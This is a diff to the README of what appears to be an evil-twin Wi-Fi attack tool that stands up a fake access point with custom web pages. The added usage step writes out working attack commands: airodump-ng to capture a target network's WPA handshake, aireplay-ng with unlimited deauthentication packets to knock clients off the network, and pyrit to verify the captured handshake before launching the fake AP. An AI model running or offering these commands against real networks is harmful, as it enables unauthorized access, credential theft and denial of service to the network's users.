@@ -19,6 +19,18 @@ If you wish to modify the webpages you can use following strings that will autom
 
 How to use:
 1. Run install.sh
+2. Aquire good handshake file using the following commands in two separate terminals:
+
+	airodump-ng --bssid TARGET_MAC --channel TARGET_CHANNEL -w handshakes wlan0mon
+	aireplay-ng --deauth 0 -a TARGET_MAC wlan0mon
+
+Restart the aireplay-ng command every 10-30 secs, after you see "HANDSHAKE" in top right corner in the airodump-ng terminal close both.
+Check if the handshake is good using pyrit:
+	
+	pyrit -r PATH_TO_CAP_FILE -o handshake.cap stripLive
+
+Continue to next step after verifying that at least one GOOD* handshake is present.
+
 2. Run script with following argumenst:
 -m Mac address of the fake AP
 -e ESSID of fake AP
